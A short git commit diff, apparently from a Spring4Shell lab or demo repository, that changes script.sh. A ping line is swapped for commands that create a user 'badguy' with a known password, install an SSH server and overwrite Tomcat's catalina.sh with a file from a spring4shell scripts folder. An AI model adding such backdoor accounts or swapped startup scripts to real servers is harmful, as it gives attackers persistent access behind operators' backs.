f4126c19062732c1db410ef3aa8429c9b112ccd0
Alexander Osterwald <alexander.osterwald@kisters.de>
2022-05-02 11:10:01 +0200

    better script

--- script.sh
+++ script.sh
@@ -1,1 +1,6 @@
-ping kisters.de
+echo "Create user badguy:badguy"
+useradd -p $(openssl passwd -crypt badguy) badguy
+echo "install sshd"
+apt install ssh nano -y
+echo "replace catalina.sh"
+mv ./spring4shell-scripts-main/catalina.sh /usr/local/tomcat/bin/catalina.sh -f
